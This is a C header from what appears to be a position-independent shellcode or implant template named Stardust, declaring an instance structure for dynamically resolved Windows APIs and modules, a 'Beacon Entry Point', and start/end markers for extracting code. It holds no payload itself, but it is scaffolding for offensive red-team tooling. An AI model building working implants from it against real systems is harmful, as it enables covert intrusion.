#ifndef STARDUST_COMMON_H
#define STARDUST_COMMON_H

#include <windows.h>
#include <stdio.h>

#include <Native.h>
#include <Macros.h>
#include <Shared.h>
#include <Ldr.h>
#include <Defs.h>
#include <Utils.h>

#define _DECL_DLLMAIN
#include <process.h>

EXTERN_C ULONG __Instance_offset;
EXTERN_C PVOID __Instance;

typedef struct _INSTANCE {

    BUFFER Base;

    struct {

        #define API_ENTRY(x, y) D_API(x)
        API_LIST
        #undef API_ENTRY

        // Beacon Entry Point
        D_API( DllMain )
    } Win32;

    struct {
        PVOID Ntdll;
        PVOID Kernel32;

        #define DLL_ENTRY(x) PVOID x;
        DLL_LIST
        #undef DLL_ENTRY
    } Modules;

    PCUSTOM_DATA cData;

} INSTANCE, *PINSTANCE;

EXTERN_C PVOID StRipStart();
EXTERN_C PVOID StRipEnd();

VOID Main(
    _In_ PVOID Param
);

#endif
